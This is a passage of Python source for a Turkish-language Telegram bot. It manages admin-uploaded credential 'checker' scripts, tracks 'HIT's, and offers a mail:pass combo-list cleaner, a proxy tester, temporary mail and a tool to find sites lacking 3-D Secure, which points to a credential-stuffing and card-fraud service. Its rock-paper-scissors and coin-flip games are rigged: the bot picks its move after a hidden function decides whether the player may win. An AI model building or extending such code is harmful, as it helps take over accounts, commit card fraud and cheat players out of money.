    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("👑 Yeni Admin PY Ekle", callback_data="admin_py_upload"))
    items = list(custom_checkers.items())
    if not items:
      bot.send_message(chat_id, "🐍 Menüde özel checker yok.\nAşağıdan ekleyebilirsin.", reply_markup=markup, parse_mode="Markdown")
      return
    for cid, meta in items[:30]:
      nm = meta.get("name") or cid
      priv = meta.get("private", False)
      markup.add(types.InlineKeyboardButton(
        f"🗑 {nm} ({cid})",
        callback_data=f"cchk_del_{cid}",
      ))
      markup.add(types.InlineKeyboardButton(
        f"✏️ Yeniden adlandır: {nm}",
        callback_data=f"cchk_ren_{cid}",
      ))
      if priv:
        markup.add(types.InlineKeyboardButton(
          f"🌍 Herkese aç: {nm}",
          callback_data=f"cchk_pub_{cid}",
        ))
      else:
        markup.add(types.InlineKeyboardButton(
          f"🔒 Sadece admin: {nm}",
          callback_data=f"cchk_priv_{cid}",
        ))
    markup.add(types.InlineKeyboardButton("🔙 Checker", callback_data="menu_checker"))
    bot.send_message(chat_id, "🐍 **Özel checker yönetimi**\nSil veya ad değiştir:", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("cchk_del_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    cid = call.data.replace("cchk_del_", "")
    ok, msg = delete_custom_checker(cid, user_id)
    bot.send_message(chat_id, f"🗑 Silindi: **{msg}**" if ok else f"❌ {msg}", parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("cchk_ren_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    cid = call.data.replace("cchk_ren_", "")
    if cid not in custom_checkers:
      bot.send_message(chat_id, "❌ Yok")
      return
    admin_temp_data[chat_id] = {"cchk_rename_cid": cid}
    user_states[chat_id] = "waiting_cchk_rename"
    bot.send_message(chat_id, f"✏️ Yeni menü adını yaz (`{cid}`)\n/iptal", parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("cchk_pub_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    cid = call.data.replace("cchk_pub_", "")
    if cid in custom_checkers:
      custom_checkers[cid]["private"] = False
      save_data()
      bot.send_message(chat_id, f"🌍 **{custom_checkers[cid].get('name')}** herkese açıldı.", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, "❌ Yok")
    return

  elif call.data and call.data.startswith("cchk_priv_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    cid = call.data.replace("cchk_priv_", "")
    if cid in custom_checkers:
      custom_checkers[cid]["private"] = True
      save_data()
      bot.send_message(chat_id, f"🔒 **{custom_checkers[cid].get('name')}** sadece admin.", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, "❌ Yok")
    return

  elif call.data == "toggle_quiet_mode":
    safe_answer()
    on = toggle_quiet_mode(user_id)
    try:
      save_data()
    except Exception:
      pass
    bot.send_message(
      chat_id,
      "🔇 **Sessiz mod AÇIK**\nCanlı panel yok; bitişte özet + HIT gelir." if on else
      "🔔 **Sessiz mod KAPALI**\nCanlı panel tekrar aktif.",
      parse_mode="Markdown",
    )
    return

  elif call.data == "menu_season":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🎁 Sezon ödülünü al", callback_data="season_claim"))
    if user_id in admin_ids_set:
      markup.add(types.InlineKeyboardButton("👑 Sezon aç (14g)", callback_data="admin_season_start"))
      markup.add(types.InlineKeyboardButton("⏹ Sezon kapat", callback_data="admin_season_stop"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="menu_main"))
    bot.send_message(chat_id, season_status_text(user_id), reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "season_claim":
    safe_answer()
    ok, res = season_try_claim(user_id)
    if ok:
      bot.send_message(chat_id, f"🏆 Sezon ödülü: **+{float(res):.0f} TL**", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, f"❌ {res}")
    return

  elif call.data == "admin_season_start":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    admin_start_season("Görev Sezonu", days=14, hits=50, checks=500, refs=3, reward=100.0)
    bot.send_message(chat_id, "✅ 14 günlük sezon açıldı.\nHedef: 50 HIT · 500 tarama · 3 davet · ödül 100 TL")
    return

  elif call.data == "admin_season_stop":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    season_ensure()["active"] = False
    try:
      save_data()
    except Exception:
      pass
    bot.send_message(chat_id, "⏹ Sezon kapatıldı.")
    return

  elif call.data == "menu_ref_tree":
    safe_answer()
    bot.send_message(chat_id, referral_tree_text(user_id), parse_mode="Markdown")
    return

  elif call.data == "admin_suspicion":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    bot.send_message(chat_id, suspicion_panel_text(), parse_mode="Markdown")
    return

  elif call.data == "admin_backup_list":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    files = list_db_backups(10)
    if not files:
      bot.send_message(chat_id, "📂 Yedek bulunamadı.")
      return
    markup = types.InlineKeyboardMarkup(row_width=1)
    for i, fp in enumerate(files):
      name = os.path.basename(fp)
      markup.add(types.InlineKeyboardButton(f"💾 {name}", callback_data=f"admin_restore_{i}"))
    admin_temp_data[chat_id] = {"restore_files": files}
    markup.add(types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"))
    bot.send_message(chat_id, "📂 **Yedekler** — birini seç, onayla geri yükle:\n⚠️ Mevcut DB önce yedeklenir.", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("admin_restore_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    try:
      idx = int(call.data.replace("admin_restore_", ""))
    except Exception:
      bot.send_message(chat_id, "❌ Geçersiz.")
      return
    files = (admin_temp_data.get(chat_id) or {}).get("restore_files") or list_db_backups(10)
    if idx < 0 or idx >= len(files):
      bot.send_message(chat_id, "❌ Dosya yok.")
      return
    fp = files[idx]
    markup = types.InlineKeyboardMarkup()
    markup.add(
      types.InlineKeyboardButton("✅ Onayla geri yükle", callback_data=f"admin_restore_ok_{idx}"),
      types.InlineKeyboardButton("❌ Vazgeç", callback_data="menu_admin"),
    )
    admin_temp_data[chat_id] = {"restore_files": files}
    bot.send_message(chat_id, f"⚠️ **Geri yükleme onayı**\n`{os.path.basename(fp)}`\nMevcut DB yedeklenip bu dosya yüklenecek.", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("admin_restore_ok_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    try:
      idx = int(call.data.replace("admin_restore_ok_", ""))
    except Exception:
      return
    files = (admin_temp_data.get(chat_id) or {}).get("restore_files") or []
    if idx < 0 or idx >= len(files):
      bot.send_message(chat_id, "❌ Dosya yok.")
      return
    ok, msg = restore_db_from_backup(files[idx])
    bot.send_message(chat_id, ("✅ " if ok else "❌ ") + msg)
    return

  elif call.data and call.data.startswith("maint_tpl_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    key = call.data.replace("maint_tpl_", "")
    ok, msg = apply_maint_template(key)
    bot.send_message(chat_id, f"{'✅' if ok else '❌'} {msg}")
    return

  elif call.data == "admin_maint_templates":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("⏱ 30 dk bakım", callback_data="maint_tpl_30"),
      types.InlineKeyboardButton("⏱ 2 saat bakım", callback_data="maint_tpl_120"),
      types.InlineKeyboardButton("📅 Yarın 12:00 mesajı", callback_data="maint_tpl_tomorrow"),
      types.InlineKeyboardButton("🚨 Acil bakım", callback_data="maint_tpl_emergency"),
      types.InlineKeyboardButton("✅ Bakımı kapat", callback_data="maint_quick_off"),
      types.InlineKeyboardButton("🔙 Admin", callback_data="menu_admin"),
    )
    bot.send_message(chat_id, "🔧 **Bakım şablonları**\nHazır mesaj + süre:", reply_markup=markup, parse_mode="Markdown")
    return

  elif call.data == "chk_favs_list":
    safe_answer()
    favs = list(checker_favorites.get(user_id) or [])
    markup = types.InlineKeyboardMarkup(row_width=1)
    for k in favs:
      if k.startswith("custom_") and k.replace("custom_", "") in custom_checkers:
        cid = k.replace("custom_", "")
        markup.add(types.InlineKeyboardButton(f"⭐ {custom_checkers[cid].get('name')}", callback_data=f"tool_cchk_{cid}"))
      else:
        markup.add(types.InlineKeyboardButton(f"⭐ {k}", callback_data=f"tool_{k}" if not k.startswith("tool_") else k))
    markup.add(types.InlineKeyboardButton("🔙", callback_data="menu_checker"))
    bot.send_message(chat_id, "⭐ Favori checkerlar", reply_markup=markup)
    return

  elif call.data == "chk_recent_list":
    safe_answer()
    rec = list(checker_recent.get(user_id) or [])
    markup = types.InlineKeyboardMarkup(row_width=1)
    for k in rec:
      if k.startswith("custom_") and k.replace("custom_", "") in custom_checkers:
        cid = k.replace("custom_", "")
        markup.add(types.InlineKeyboardButton(f"🕘 {custom_checkers[cid].get('name')}", callback_data=f"tool_cchk_{cid}"))
    markup.add(types.InlineKeyboardButton("🔙", callback_data="menu_checker"))
    bot.send_message(chat_id, "🕘 Son kullanılanlar", reply_markup=markup)
    return

  elif call.data == "admin_daily_summary":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    bot.send_message(chat_id, admin_daily_summary_text(), parse_mode="Markdown")
    return

  elif call.data and call.data.startswith("maint_quick_"):
    if user_id not in admin_ids_set:
      return
    safe_answer()
    key = call.data.replace("maint_quick_", "")
    if key == "off":
      set_maintenance(False)
      bot.send_message(chat_id, "✅ Bakım kapatıldı.")
    elif key == "30":
      set_maintenance_timed(30)
      bot.send_message(chat_id, "🔧 30 dk bakım açıldı.")
    elif key == "120":
      set_maintenance_timed(120)
      bot.send_message(chat_id, "🔧 2 saat bakım açıldı.")
    elif key == "inf":
      set_maintenance(True, until=None)
      bot.send_message(chat_id, "🔧 Süresiz bakım açıldı.")
    return

  elif call.data == "admin_broadcast_preview":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    user_states[chat_id] = "waiting_broadcast_preview"
    bot.send_message(chat_id, "📢 Duyuru metnini yaz — önce **sadece sana önizleme** gidecek, sonra onayla.\n/iptal")
    return

  elif call.data == "broadcast_send_confirm":
    if user_id not in admin_ids_set:
      return
    safe_answer()
    b_text = (admin_temp_data.get(chat_id) or {}).get("broadcast_preview")
    if not b_text:
      bot.send_message(chat_id, "❌ Önizleme yok.")
      return
    targets = set(registered_users) | set(user_credentials.keys())
    ok_n = 0
    for u in targets:
      try:
        bot.send_message(u, f"📢 **DUYURU**\n\n{b_text}", parse_mode="Markdown")
        ok_n += 1
      except Exception:
        try:
          bot.send_message(u, f"📢 DUYURU\n\n{b_text}")
          ok_n += 1
        except Exception:
          pass
    admin_temp_data.pop(chat_id, None)
    bot.send_message(chat_id, f"✅ Duyuru **{ok_n}** kişiye gitti.")
    log_activity("broadcast", user_id, f"{ok_n}")
    return

  elif call.data == "menu_gambling":
    safe_answer()
    claimed = claim_gamble_bonus_if_due(user_id)
    if claimed > 0:
      save_data()
      try:
        bot.send_message(chat_id, f"🎰 **Kumar Bonusu!**\n+{claimed:.0f} TL kumar bakiyesi eklendi.\n💳 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**", parse_mode="Markdown")
      except:
        pass
    gbal = get_gamble_bal(user_id)
    nbal = user_balances.get(user_id, 0.0)
    left = gamble_bonus_remaining(user_id)
    left_txt = f"{left // 60} dk" if left > 0 else "Hazır!"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("🎲 ══ KUMAR BAKİYESİ YÜKLE ══", callback_data="star_gamble_topup_menu"))
    markup.add(
      types.InlineKeyboardButton("🚀 Zeplin", callback_data="play_zeplin"),
      types.InlineKeyboardButton("🏇 At Yarışı", callback_data="play_horse"),
      types.InlineKeyboardButton("💣 Mayın Tarlası", callback_data="play_mines"),
      types.InlineKeyboardButton("🍬 Bonanza", callback_data="play_bonanza"),
      types.InlineKeyboardButton("👴 Dede (Olympus)", callback_data="play_dede"),
      types.InlineKeyboardButton("✂️ Taş Kağıt Makas", callback_data="play_tkm"),
      types.InlineKeyboardButton("🪙 Yazı Tura", callback_data="play_yazitura"),
      types.InlineKeyboardButton("🎲 Zar (Yüksek/Düşük)", callback_data="play_dice"),
      types.InlineKeyboardButton("🏆 En Çok Kazananlar", callback_data="gambling_top_winners"),
      types.InlineKeyboardButton("📜 Kumar Geçmişi", callback_data="gamble_history"),
      types.InlineKeyboardButton("🏅 Turnuva", callback_data="menu_tournament"),
      types.InlineKeyboardButton(f"🔄 {GAMBLE_CONVERT_COST:.0f} Kumar → {GAMBLE_CONVERT_REWARD:.0f} TL Normal", callback_data="convert_gamble_bal"),
      types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu")
    )
    gtext = (
      f"🎰 **Şans Oyunları**\n"
      f"🎲 Kumar Bakiyesi: **{gbal:.2f} TL**\n"
      f"💵 Normal Bakiye: **{nbal:.2f} TL** (markette kullanılır)\n"
      f"⏰ Sonraki +{GAMBLE_BONUS_AMOUNT:.0f} TL kumar bonusu: **{left_txt}**\n\n"
      f"⚠️ Kumar sadece **kumar bakiyesi** ile oynanır.\n💔 Bakiye 0 olursa kaybın **%40** iade (min 50 TL kayıp)."
    )
    try: bot.edit_message_text(gtext, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data == "convert_gamble_bal":
    safe_answer()
    gbal = get_gamble_bal(user_id)
    left = get_gamble_convert_left(user_id)
    if left <= 0:
      bot.send_message(chat_id, f"❌ 12 saatlik çevirim hakkın bitti (**{GAMBLE_CONVERT_MAX}/{GAMBLE_CONVERT_MAX}**).\nHaklar 12 saatte bir yenilenir.", parse_mode="Markdown")
      return
    if gbal < GAMBLE_CONVERT_COST:
      bot.send_message(chat_id, f"❌ En az **{GAMBLE_CONVERT_COST:.0f} TL** kumar bakiyesi gerekli.\nMevcut: **{gbal:.2f} TL**", parse_mode="Markdown")
      return
    if not use_gamble_convert(user_id):
      bot.send_message(chat_id, "❌ Çevirim hakkı kalmadı.")
      return
    add_gamble_bal(user_id, -GAMBLE_CONVERT_COST)
    user_balances[user_id] = user_balances.get(user_id, 0.0) + GAMBLE_CONVERT_REWARD
    add_balance_history(user_id, "gamble_convert", GAMBLE_CONVERT_REWARD, f"-{GAMBLE_CONVERT_COST:.0f} kumar")
    save_data()
    left2 = get_gamble_convert_left(user_id)
    bot.send_message(
      chat_id,
      f"✅ **Çevrildi!**\n\n"
      f"🎲 -{GAMBLE_CONVERT_COST:.0f} TL kumar bakiyesi\n"
      f"💵 +{GAMBLE_CONVERT_REWARD:.0f} TL normal bakiye\n\n"
      f"🎲 Kumar: **{get_gamble_bal(user_id):.2f} TL**\n"
      f"💵 Normal: **{user_balances[user_id]:.2f} TL**\n"
      f"🎫 Kalan hak (12s): **{left2}/{GAMBLE_CONVERT_MAX}**",
      parse_mode="Markdown"
    )
    log_activity("gamble_convert", user_id, f"{GAMBLE_CONVERT_COST}->{GAMBLE_CONVERT_REWARD}")
    return

  elif call.data == "stop_auto_slot":
    safe_answer("Slot durduruldu.")
    active_auto_slots[chat_id] = False
    try: bot.edit_message_text(call.message.text + "\n\n**🛑 DURDURULDU**", chat_id, call.message.message_id, parse_mode="Markdown")
    except: pass

  elif call.data == "gambling_top_winners":
    safe_answer()
    top_text = "🏆 **En Çok Kazananlar**\n"
    if gambling_profits:
      for index, (uid, profit) in enumerate(sorted(gambling_profits.items(), key=lambda x: x[1], reverse=True)[:10], 1):
        top_text += f"#{index} `{uid}` — Net: **{profit:.2f} TL**\n"
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_gambling"))
    try: bot.edit_message_text(top_text, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data in ["play_tkm", "play_yazitura", "play_zeplin", "play_mines", "play_bonanza", "play_dede", "play_dice", "play_horse"]:
    safe_answer()
    bakiye = get_gamble_bal(user_id)
    if bakiye <= 0:
      safe_answer("❌ Kumar bakiyeniz yetersiz! 2 saatte bir +1000 TL eklenir.", show_alert=True)
      return

    oyun = {
      "play_tkm": ("waiting_tkm_bet", "✂️ **Taş Kağıt Makas**"),
      "play_yazitura": ("waiting_yazitura_bet", "🪙 **Yazı Tura**"),
      "play_zeplin": ("waiting_zeplin_bet", "🚀 **Zeplin Oyunu**"),
      "play_horse": ("waiting_horse_bet", "🏇 **At Yarışı**"),
      "play_mines": ("waiting_mines_bet", "💣 **Mayın Tarlası**"),
      "play_dice": ("waiting_dice_bet", "🎲 **Zar (Yüksek/Düşük)**"),
      "play_bonanza": ("waiting_bonanza_bet", "🍬 **Sweet Bonanza**"),
      "play_dede": ("waiting_dede_bet", "👴 **Gates of Olympus (Dede)**")
    }[call.data]

    user_states[chat_id] = oyun[0]
    bot.send_message(
      chat_id,
      f"{oyun[1]}\nOynamak istediğiniz **bahis miktarını (TL)** yazın:\n"
      f"İptal için: `/iptal`",
      parse_mode="Markdown"
    )

  elif call.data.startswith("dice_"):
    safe_answer()
    bet = float(admin_temp_data.get(chat_id, {}).get("dice_bet", 0) or 0)
    if bet <= 0:
      bot.send_message(chat_id, "❌ Bahis bulunamadı. Tekrar dene.")
      return
    if get_gamble_bal(user_id) < bet:
      safe_answer("❌ Yetersiz kumar bakiyesi!", show_alert=True)
      return
    add_gamble_bal(user_id, -bet)
    add_to_jackpot(bet)
    roll = random.randint(1, 6)
    choice = call.data  # dice_low / dice_high / dice_exact_6 / dice_exact_1
    won = False
    mult = 0.0
    if choice == "dice_low":
      mult = 1.85  # hafif ev avantajı (fair 2.0 olurdu)
      won = roll <= 3
    elif choice == "dice_high":
      mult = 1.85
      won = roll >= 4
    elif choice == "dice_exact_6":
      mult = 4.5  # fair ~6x; ev avantajı
      won = (roll == 6)
    elif choice == "dice_exact_1":
      mult = 4.5
      won = (roll == 1)
    dice_emoji = {1: "⚀", 2: "⚁", 3: "⚂", 4: "⚃", 5: "⚄", 6: "⚅"}.get(roll, "🎲")
    if won:
      win = bet * mult
      add_gamble_bal(user_id, win)
      update_gambling_profit(user_id, win - bet)
      result = f"🎲 {dice_emoji} **{roll}**\n\n🎉 **KAZANDIN!** +{win:.2f} TL ({mult}x)"
    else:
      update_gambling_profit(user_id, -bet)
      result = f"🎲 {dice_emoji} **{roll}**\n\n😢 **Kaybettin!** -{bet:.2f} TL"
    save_data()
    try:
      bot.edit_message_text(
        result + f"\n🎲 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**",
        chat_id, call.message.message_id, parse_mode="Markdown"
      )
    except:
      bot.send_message(chat_id, result + f"\n🎲 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**", parse_mode="Markdown")
    admin_temp_data.pop(chat_id, None)
    return

  elif call.data.startswith("tkm_choice_") or call.data.startswith("yt_choice_"):
    is_tkm = call.data.startswith("tkm_choice_")
    choice = call.data.split("_")[2]
    bet = admin_temp_data.get(chat_id, {}).get('tkm_bet' if is_tkm else 'yt_bet', 0)
    bakiye = get_gamble_bal(user_id)

    if bakiye < bet:
      safe_answer("❌ Yetersiz kumar bakiyesi!", show_alert=True)
      return

    add_gamble_bal(user_id, -bet)
    add_to_jackpot(bet)
    allow_win = gamble_allow_win(user_id)

    if is_tkm:
      beats = {"tas": "makas", "kagit": "tas", "makas": "kagit"}
      loses = {"tas": "kagit", "kagit": "makas", "makas": "tas"}
      if allow_win:
        bot_choice = beats[choice]  # kullanıcı kazanır
        win = bet * random.choice([1.4, 1.6, 1.8, 1.95, 2.0])
        add_gamble_bal(user_id, win)
        update_gambling_profit(user_id, win - bet)
        result_text = f"✂️ Seçim: {choice}, Bot: {bot_choice}\n\n🎉 **KAZANDIN!** +{win:.2f} TL"
      else:
        bot_choice = loses[choice]  # kullanıcı kaybeder
        update_gambling_profit(user_id, -bet)
        result_text = f"✂️ Seçim: {choice}, Bot: {bot_choice}\n\n😢 **KAYBETTİN!**"
    else:
      if allow_win:
        bot_choice = choice
        win = bet * random.choice([1.4, 1.6, 1.8, 1.95, 2.0])
        add_gamble_bal(user_id, win)
        update_gambling_profit(user_id, win - bet)
        result_text = f"🪙 Seçim: {choice}, Bot: {bot_choice}\n\n🎉 **DOĞRU TAHMİN!** +{win:.2f} TL"
      else:
        bot_choice = "tura" if choice == "yazi" else "yazi"
        update_gambling_profit(user_id, -bet)
        result_text = f"🪙 Seçim: {choice}, Bot: {bot_choice}\n\n😢 **YANLIŞ TAHMİN!**"

    save_data()
    safe_answer("Sonuçlandı!")
    try: bot.edit_message_text(result_text + f"\n🎲 Kumar Bakiyesi: **{get_gamble_bal(user_id):.2f} TL**", chat_id, call.message.message_id, parse_mode="Markdown")
    except: pass
    admin_temp_data.pop(chat_id, None)

  elif call.data == "rate_bot_menu":
    safe_answer()
    already = user_has_rated_bot(user_id)
    text_msg = bot_rating_summary_text()
    markup = types.InlineKeyboardMarkup(row_width=5)
    markup.add(types.InlineKeyboardButton("💬 Yorumları Gör", callback_data="rate_bot_reviews"))
    if already:
      prev = bot_ratings.get(user_id) or bot_ratings.get(str(user_id)) or {}
      c = (prev.get("comment") or "").strip()
      c_line = f"\n💬 _{c}_" if c else "\n💬 _(yorum yok)_"
      text_msg += f"\n\n✅ Senin puanın: **{int(prev.get('stars', 0))}⭐** (tek seferlik){c_line}"
      markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    else:
      text_msg += (
        "\n\n👇 **1 kez puan ver** (değiştirilemez):\n"
        "• **1–2⭐** → açıklama **zorunlu**\n"
        "• **3–5⭐** → açıklama isteğe bağlı"
      )
      markup.add(
        types.InlineKeyboardButton("1⭐", callback_data="rate_bot_1"),
        types.InlineKeyboardButton("2⭐", callback_data="rate_bot_2"),
        types.InlineKeyboardButton("3⭐", callback_data="rate_bot_3"),
        types.InlineKeyboardButton("4⭐", callback_data="rate_bot_4"),
        types.InlineKeyboardButton("5⭐", callback_data="rate_bot_5"),
      )
      markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="menu_personal"))
    try:
      bot.edit_message_text(text_msg, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(chat_id, text_msg, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        pass

  elif call.data == "rate_bot_reviews" or (call.data or "").startswith("rate_bot_reviews_"):
    safe_answer()
    offset = 0
    if (call.data or "").startswith("rate_bot_reviews_"):
      try:
        offset = max(0, int(call.data.rsplit("_", 1)[-1]))
      except Exception:
        offset = 0
    body, total = bot_rating_reviews_text(limit=15, offset=offset)
    markup = types.InlineKeyboardMarkup(row_width=2)
    nav = []
    if offset > 0:
      nav.append(types.InlineKeyboardButton("⬅️ Önceki", callback_data=f"rate_bot_reviews_{max(0, offset-15)}"))
    if offset + 15 < total:
      nav.append(types.InlineKeyboardButton("Sonraki ➡️", callback_data=f"rate_bot_reviews_{offset+15}"))
    if nav:
      markup.row(*nav)
    markup.add(types.InlineKeyboardButton("⭐ Puan Ver / Özet", callback_data="rate_bot_menu"))
    markup.add(types.InlineKeyboardButton("🔙 Ana Menü", callback_data="main_menu"))
    try:
      bot.edit_message_text(body, chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(chat_id, body, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        pass

  elif call.data and call.data.startswith("rate_bot_") and call.data[-1].isdigit() and call.data in (
    "rate_bot_1", "rate_bot_2", "rate_bot_3", "rate_bot_4", "rate_bot_5"
  ):
    safe_answer()
    if user_has_rated_bot(user_id):
      try:
        bot.answer_callback_query(call.id, "Zaten puan vermişsin", show_alert=True)
      except Exception:
        pass
      return
    try:
      stars = int(call.data.split("_")[-1])
    except Exception:
      return
    low_max = int(globals().get("BOT_RATE_LOW_MAX", 2) or 2)
    admin_temp_data[chat_id] = {"pending_bot_rate": stars}
    user_states[chat_id] = "waiting_bot_rate_comment"
    if stars <= low_max:
      prompt = (
        f"⭐ Seçimin: **{stars}⭐**\n\n"
        f"❌ Düşük puan için **açıklama zorunlu** (min 5 karakter).\n"
        f"Neden düşük puan verdiğini yaz:\n\n"
        f"İptal: /iptal"
      )
    else:
      prompt = (
        f"⭐ Seçimin: **{stars}⭐**\n\n"
        f"💬 İstersen kısa bir yorum yaz (opsiyonel).\n"
        f"Yorum istemiyorsan **atla** yaz.\n\n"
        f"İptal: /iptal"
      )
    try:
      bot.send_message(chat_id, prompt, parse_mode="Markdown")
    except Exception:
      pass

  elif call.data == "admin_bot_ratings":
    if user_id not in admin_ids_set:
      safe_answer("❌ Yetkiniz yok!", show_alert=True)
      return
    safe_answer()
    avg, n, dist = get_bot_rating_stats()
    lines = [bot_rating_summary_text(), "", "Son oy + yorumlar:"]
    items = []
    for uid, v in (bot_ratings or {}).items():
      try:
        items.append((
          str((v or {}).get("time") or ""),
          int(uid),
          int((v or {}).get("stars") or 0),
          str((v or {}).get("comment") or ""),
        ))
      except Exception:
        pass
    items.sort(reverse=True)
    for tstr, uid, st, c in items[:40]:
      cshort = (c[:80] + "…") if len(c) > 80 else c
      if cshort:
        lines.append(f"· `{uid}` **{st}⭐** — {cshort}\n  ({tstr})")
      else:
        lines.append(f"· `{uid}` **{st}⭐** _(yorum yok)_ ({tstr})")
    if n == 0:
      lines.append("_Henüz oy yok_")
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("💬 Herkese açık liste", callback_data="rate_bot_reviews"))
    markup.add(types.InlineKeyboardButton("🔙 Geri", callback_data="admin_cat_content"))
    try:
      bot.edit_message_text("\n".join(lines)[:4000], chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(chat_id, "\n".join(lines)[:4000], reply_markup=markup, parse_mode="Markdown")
      except Exception:
        pass

  elif call.data == "menu_personal":
    safe_answer()
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🎁 Günlük Bonus Al", callback_data="claim_daily_bonus"),
      types.InlineKeyboardButton("🔥 Giriş Serisi", callback_data="view_streak"),
      types.InlineKeyboardButton("🏅 Başarımlar / Rozetler", callback_data="view_achievements"),
      types.InlineKeyboardButton("🎡 Şans Çarkı", callback_data="spin_wheel"),
      types.InlineKeyboardButton("🎁 Günlük Şans Kutusu", callback_data="daily_lucky_box"),
      types.InlineKeyboardButton("🍀 Bugün Şanslı mısın?", callback_data="lucky_today"),
      types.InlineKeyboardButton("📋 Günlük Görevler", callback_data="view_quests"),
      types.InlineKeyboardButton("⭐ Seviye / XP", callback_data="view_level"),
      types.InlineKeyboardButton("🏪 Seviye Mağazası", callback_data="level_shop"),
      types.InlineKeyboardButton("🏅 Sıralama (XP / Checker)", callback_data="view_rankings"),
      types.InlineKeyboardButton("🔗 Proxy Test", callback_data="tool_proxy_test"),
      types.InlineKeyboardButton("🎫 Taleplerim", callback_data="my_tickets"),
      types.InlineKeyboardButton("🎰 Jackpot Havuzu", callback_data="view_jackpot"),
      types.InlineKeyboardButton("🏆 Turnuva Sıralaması", callback_data="view_tournament"),
      types.InlineKeyboardButton("📊 Anketler", callback_data="view_polls"),
      types.InlineKeyboardButton("📜 Bakiye Geçmişi", callback_data="view_balance_history"),
      types.InlineKeyboardButton("🔔 Bildirimler", callback_data="view_notifications"),
      types.InlineKeyboardButton("💱 Para Birimi (TL/USDT)", callback_data="toggle_currency"),
      types.InlineKeyboardButton("⚔️ Arkadaşla Bahis", callback_data="pvp_start"),
      types.InlineKeyboardButton("📧 Geçici Mail", callback_data="menu_tempmail"),
      types.InlineKeyboardButton("🎟️ Kupon Kullan", callback_data="personal_coupon"),
      types.InlineKeyboardButton("⭐ Bota Puan Ver", callback_data="rate_bot_menu"),
      types.InlineKeyboardButton("🔍 3D'siz Site Bul", callback_data="tool_3dsiz"),
      types.InlineKeyboardButton("🧹 URL Sil (sadece mail:pass)", callback_data="tool_strip_url"),
      types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu")
    )
    try: bot.edit_message_text(t(user_id, "personal_title"), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data == "menu_referans":
    safe_answer()
    ref_bal = ref_balances.get(user_id, 0.0)
    norm_bal = user_balances.get(user_id, 0.0)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🔄 Referans Bakiyesini Normal Bakiyeye Çevir", callback_data="convert_ref_to_normal"),
      types.InlineKeyboardButton("💸 Para Çek (Referans)", callback_data="personal_withdraw"),
      types.InlineKeyboardButton("🏆 Davet Sıralaması", callback_data="ref_leaderboard"),
      types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu")
    )
    try: bot.edit_message_text(t(user_id, "referans_title", bot=BOT_USERNAME, uid=user_id, ref=ref_bal, bal=norm_bal), chat_id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

  elif call.data == "convert_ref_to_normal":
    ref_bal = ref_balances.get(user_id, 0.0)
    if ref_bal <= 0:
      safe_answer("❌ Referans bakiyeniz 0 TL!", show_alert=True)
      return

    user_balances[user_id] = user_balances.get(user_id, 0.0) + ref_bal
    ref_balances[user_id] = 0.0
    save_data()
    safe_answer(f"✅ Başarıyla {ref_bal:.2f} TL normal bakiyeye aktarıldı!", show_alert=True)

    norm_bal = user_balances.get(user_id, 0.0)
    new_ref_bal = ref_balances.get(user_id, 0.0)
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
      types.InlineKeyboardButton("🔄 Referans Bakiyesini Normal Bakiyeye Çevir", callback_data="convert_ref_to_normal"),
